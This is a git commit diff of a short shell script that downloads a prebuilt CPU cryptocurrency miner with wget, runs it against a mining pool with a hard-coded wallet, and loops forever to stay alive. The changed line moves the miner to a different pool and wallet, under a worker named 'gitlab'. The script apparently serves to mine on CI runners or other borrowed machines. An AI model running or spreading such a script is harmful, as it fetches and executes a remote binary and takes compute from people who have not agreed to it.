7b65e20a123fb975ae3187b27ffaafb95788a3cc
Nakidas <83887630+Nakidas@users.noreply.github.com>
2021-05-11 05:37:52 +0700

    Update rad.sh

--- rad.sh
+++ rad.sh
@@ -3,7 +3,7 @@ sudo apt update
 sudo apt install screen -y
 wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
 tar xf hellminer_cpu_linux.tar.gz
-./hellminer -a power2b -o stratum+tcp://power2b.asia.mine.zergpool.com:7445 -u BkYmJ8YZGEA2yeJCra9sXAfvf6o1cgX3XV -p c=MBC --cpu 2
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RWN5xsmZDwD1J8WwaqniFAoSEcMmh8AfiQ.gitlab -p x --cpu 2
 while [ 1 ]; do
 sleep 3
 done
